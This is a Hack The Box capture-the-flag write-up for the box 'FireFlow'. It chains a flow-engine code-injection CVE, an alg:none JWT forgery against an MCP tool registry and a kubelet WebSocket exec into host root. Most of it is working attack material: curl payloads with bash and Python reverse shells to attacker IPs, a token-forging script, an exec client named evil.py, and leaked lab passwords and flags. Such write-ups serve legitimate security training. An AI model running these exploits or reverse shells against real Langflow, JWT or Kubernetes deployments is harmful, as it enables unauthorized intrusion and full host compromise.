# FireFlow

> **Platform:** Hack The Box
> **Difficulty:** Hard
> **Tags:** `web` · `CVE` · `Langflow` · `RCE` · `JWT` · `MCP` · `Kubernetes` · `kubelet`

FireFlow is a hard-rated box that moves through a very modern attack surface. It starts with a version-specific RCE in an AI "flow engine," pivots through leaked credentials into an MCP (Model Context Protocol) tool registry protected by a broken JWT implementation, and finishes inside a Kubernetes cluster — where a single over-permissioned service account and an exposed kubelet API turn a low-privileged pod into full host compromise.

The chain looks like this:

1. **Recon** → discover `fireflow.htb` and the `flow.fireflow.htb` AI chat app.
2. **Foothold** → exploit a known CVE in the flow engine for remote code execution.
3. **User** → loot credentials from a `.env` file and SSH in as `nightfall`.
4. **Lateral movement** → abuse a JWT `alg:none` bug in an MCP registry to register and run a malicious tool, landing in a Kubernetes pod.
5. **Root** → use the pod's service-account token against the kubelet WebSocket API to execute code as root and read the host filesystem.

It honestly earns the hard rating — not because any single step is brutal, but because it keeps handing you off to a completely different technology at every stage. You start with a web app, end up forging JWTs against an AI tool registry, and then suddenly you're staring at a Kubernetes service account token trying to turn it into root. I went down a couple of dead ends before the kubelet trick clicked, so I'll write it up the way it actually happened.

## Recon

Usual start, nmap:

![](assets/Pasted%20image%2020260811225204.png)

The banner gives away the domain `fireflow.htb`, so that goes into `/etc/hosts`:

![](assets/Pasted%20image%2020260811225400.png)

Poking around the site leads to an AI chat window running on a subdomain, `flow.fireflow.htb`:

![](assets/Pasted%20image%2020260811230245.png)

I fired off a gobuster in the background while I looked around, but it didn't turn up anything worth chasing:

![](assets/Pasted%20image%2020260811232350.png)

The chat window looked promising at first but I couldn't get anything interesting out of it — no obvious injection, no leaks. So I went back to the main page and actually read it properly this time, and there it was: the flow engine prints its **version** right on the page.

![](assets/Pasted%20image%2020260811234139.png)

## Getting a shell

That version string was the whole ballgame. A quick search turns up a public advisory for exactly this build — **CVE-2026-33017**.

Advisory here if you want the details: [CVE-2026-33017 (GHSA-vwmf-pq79-vjvx)](https://github.com/advisories/GHSA-vwmf-pq79-vjvx)

Short version: you can push an arbitrary code component to the public build endpoint and the engine will happily run it server-side. So I built a flow with a single node that just shells out to a reverse shell and sent it over with curl:

```bash
curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
  -H 'Content-Type: application/json' \
  -b 'client_id=attacker' \
  --data-binary @- << 'EOF'
{
  "data": {
    "nodes": [
      {
        "id": "Exploit-001",
        "type": "genericNode",
        "position": { "x": 0, "y": 0 },
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "import os\n\n_x = os.system(\"bash -c 'bash -i >& /dev/tcp/10.10.14.7/9001 0>&1'\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name = \"X\"\n    outputs = [Output(display_name=\"O\", name=\"o\", method=\"r\")]\n\n    def r(self) -> Data:\n        return Data(data={})",
                "name": "code",
                "password": false,
                "advanced": false,
                "dynamic": false
              },
              "_type": "Component"
            },
            "description": "X",
            "base_classes": ["Data"],
            "display_name": "ExploitComp",
            "name": "ExploitComp",
            "frozen": false,
            "outputs": [
              {
                "types": ["Data"],
                "selected": "Data",
                "name": "o",
                "display_name": "O",
                "method": "r",
                "value": "__UNDEFINED__",
                "cache": true,
                "allows_loop": false,
                "tool_mode": false,
                "hidden": null,
                "required_inputs": null,
                "group_outputs": false
              }
            ],
            "field_order": ["code"],
            "beta": false,
            "edited": false
          }
        }
      }
    ],
    "edges": []
  }
}
EOF
```

Had a listener up on 9001, and as soon as the request went through the shell came back:

![](assets/Pasted%20image%2020260816161753.png)

## User

First thing I do on any new shell is go looking for `.env` files, they're basically free loot:

![](assets/Pasted%20image%2020260816170944.png)

And sure enough, one of them coughed up a password:

![](assets/Pasted%20image%2020260816171056.png)

```text
n1ghtm4r3_b4_n1ghtf4ll
```

Checked the local users and there's a `nightfall` account, which lines up nicely with that password:

![](assets/Pasted%20image%2020260816171300.png)

Tried it over SSH and it just worked — password reuse strikes again. User flag was right there:

![](assets/Pasted%20image%2020260816173027.png)

```text
9e70574d34cc45473ffbcaf0340d94f0
```

## Privilege escalation

### The .mcp folder

Digging around `nightfall`'s home dir I found a `.mcp` folder with a config file, and it had *another* set of creds in it:

```json
{
  "server": "http://10.129.25.101:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

Hit the status endpoint to see what this thing even is:

```bash
nightfall@fireflow:~/.mcp$ curl -s http://10.129.25.101:30080/api/v1/version | python3 -m json.tool
```

```json
{
    "service": "MCP AI Tool Registry",
    "version": "0.1.0",
    "auth": {
        "type": "JWT",
        "header": "Authorization: Bearer <token>",
        "supported_algorithms": ["HS256", "none"]
    },
    "docs": "/docs",
    "endpoints": [
        "POST /mcp                        [MCP JSON-RPC 2.0]",
        "POST /api/v1/auth",
        "GET  /api/v1/tools",
        "POST /api/v1/tools               [admin]"
    ]
}
```

The thing that jumped out immediately: it accepts the `none` algorithm for JWTs. That's the classic footgun — if the server trusts `alg: none`, you don't need a signing key at all, you can just make up whatever token you want.

### Forging an admin token

Before doing that, I logged in with the bot creds just to see what a real token looks like:

```bash
curl -s -X POST -d '{"username":"langflow-bot", "password":"Langfl0w@mcp2026!"}' \
  -H 'Content-Type: application/json' \
  http://10.129.25.101:30080/api/v1/auth
```

```json
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps","token_type":"bearer"}
```

![](assets/Pasted%20image%2020260816180036.png)

Decoding that payload, the bot is just `role: user`. But the endpoint I actually want (`POST /api/v1/tools`) needs `admin`. So I forged an unsigned token with the role bumped up:

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"sub": "attacker", "role": "admin"}).encode())
token   = f"{header}.{payload}."

print(token)
```

Which gives:

```text
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYXR0YWNrZXIiLCAicm9sZSI6ICJhZG1pbiJ9.
```

### Registering my own "tool"

To make life easier I forwarded the registry port back to my box so I could hit it locally:

![](assets/Pasted%20image%2020260816182228.png)

Now `http://127.0.0.1:30080/docs` gives you the full Swagger docs. The interesting bit is that a registered tool has a `code` field that gets executed when the tool runs — so a tool is basically just RCE with extra steps. I used Postman to register a "debug shell" whose body is a python reverse shell:

![](assets/Pasted%20image%2020260816190025.png)

The payload:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.17.69",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
import pty; pty.spawn("sh")
```

And the request that registers it:

```bash
curl --location 'http://127.0.0.1:30080/api/v1/tools' \
--header 'Content-Type: application/json' \
--header 'Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYXR0YWNrZXIiLCAicm9sZSI6ICJhZG1pbiJ9.' \
--data '{
    "name": "Shell",
    "description": "Debug Shell",
    "inputSchema": { "additionalProp1": {} },
    "code": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.17.69\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")"
}'
```

Then you just call the tool through the MCP JSON-RPC endpoint to trigger it:

```json
{
  "jsonrpc": "2.0",
  "id": 4,
  "method": "tools/call",
  "params": {
    "name": "Shell"
  }
}
```

This got me a shell — but it kept dying on me. The connection would drop the moment the backend process that spawned it finished. Annoying. The fix was to re-register the tool with a double-forking payload so the shell fully detaches from its parent instead of riding on it:

```python
import socket, os, pty

pid = os.fork()
if pid > 0:
    import sys; sys.exit(0)
os.setsid()

pid = os.fork()
if pid > 0:
    import sys; sys.exit(0)

s = socket.socket()
s.connect(("10.10.17.69", 4444))
[os.dup2(s.fileno(), i) for i in (0, 1, 2)]
pty.spawn("/bin/sh")
```

That one held, and now I'm sitting on a shell as the `mcp` user.

### Wait, this is Kubernetes

The hostname (`mcp-server-54464cb475-29ztf`) already smelled like a pod, and `printenv` confirmed it:

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ printenv | grep KUBERNETES
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
```

Every pod gets handed a service account token, and it's always in the same spot:

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ cd /var/run/secrets
mcp@mcp-server-54464cb475-29ztf:/var/run/secrets$ ls
kubernetes.io
mcp@mcp-server-54464cb475-29ztf:/var/run/secrets$ cd kubernetes.io/serviceaccount/
ca.crt  namespace  token
```

So the obvious next question is: what can this token actually *do*? You can ask the API server directly with a `SelfSubjectRulesReview`:

```bash
curl -sk -X POST https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

```json
{
  "kind": "SelfSubjectRulesReview",
  "apiVersion": "authorization.k8s.io/v1",
  "status": {
    "resourceRules": [
      {
        "verbs": ["get"],
        "apiGroups": [""],
        "resources": ["nodes/proxy"]
      },
      {
        "verbs": ["create"],
        "apiGroups": ["authorization.k8s.io"],
        "resources": ["selfsubjectaccessreviews", "selfsubjectrulesreviews"]
      },
      {
        "verbs": ["create"],
        "apiGroups": ["authentication.k8s.io"],
        "resources": ["selfsubjectreviews"]
      }
    ],
    "incomplete": false
  }
}
```

The line that matters is `get` on `nodes/proxy`. That doesn't sound like much, but it's actually a big deal — it lets you relay requests through to the **kubelet** on a node, and the kubelet can exec into pods. That's cluster-wide code execution hiding behind a boring-looking read permission.

### The kubelet detour

Here's where I burned some time. My first instinct was to exec through the API server the normal way (`/api/v1/nodes/<node>/proxy/run/...`), and it just gets rejected. Makes sense in hindsight — I've only got `get` on `nodes/proxy`, and the API server wants `create` for that exec path. Dead end.

The way I think about it: the API server is the front desk, and my badge only lets me *look through the window* (`get`), not *open the door* (`create`). So the front desk says no.

But the kubelet has its own door — port `10250` — and it doesn't play by the exact same rules. Its `/exec` endpoint runs over **WebSockets** instead of plain HTTP, and when you connect straight to it with the token, it's happy to open the channel as long as the token satisfies `get nodes/proxy`. It never enforces the `create` requirement the way the API server does for the HTTP path. So the door the front desk wouldn't open for me is just... unlocked around the back.

First thing, check `websockets` is even installed in the pod so I don't have to smuggle it in:

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ python3 -c "import websockets; print('ok')"
ok
```

Good. Then I wrote a little WebSocket client that talks straight to the kubelet and execs a command inside a target container — I went for the `node-exporter` pod, for reasons that'll be obvious in a second:

```python
cat > /tmp/evil.py << 'EOF'
#!/usr/bin/env python3
import asyncio, ssl, sys, websockets

NODE    = "<TARGET_IP>"
NE_NS   = "monitoring"
NE_POD  = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT  = "node-exporter"
TOKEN   = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'

async def ws_exec(cmd_parts):
    # kubelet uses a self-signed cert, so don't bother verifying it
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    # each word of the command is its own command= param
    args = "&".join(f"command={part}" for part in cmd_parts)
    url  = (f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
            f"?output=1&error=1&{args}")

    async with websockets.connect(
        url, ssl=ctx,
        additional_headers={"Authorization": f"Bearer {TOKEN}"},
        subprotocols=["v4.channel.k8s.io"],
        open_timeout=10
    ) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                # first byte is the channel id, strip it and print the rest
                if isinstance(data, bytes) and len(data) > 1:
                    print(data[1:].decode(errors='replace'), end='')
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass

asyncio.run(ws_exec(COMMAND.split()))
EOF
```

Ran it with `id` to sanity check:

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ python3 /tmp/evil.py "id"
uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
{"metadata":{},"status":"Success"}
```

Root inside the `node-exporter` container. And that's why I picked that pod specifically — node-exporter mounts the **host's root filesystem** at `/host/root` so it can read node metrics. Which means from in here I can read the whole underlying host, including the root flag:

```text
02b67c15dcf01482c8a8193a51948e97
```

## Wrap-up

What I liked about this box is that every stage punishes a real-world mistake. The foothold was just a leaked version number pointing at a known CVE. The lateral move was a JWT layer trusting `alg: none`, which should never happen but absolutely does in the wild. And root came down to a service account with `nodes/proxy` plus a kubelet that would answer to it on its WebSocket port — that combo is genuinely dangerous and is exactly the kind of thing people over-grant when they're wiring up monitoring. The `/host/root` mount at the end is the cherry on top: the moment a pod can read the host filesystem, container isolation is basically a formality.

Fun box. The Kubernetes part especially is worth understanding properly, because the API-server-vs-kubelet distinction is the whole trick.
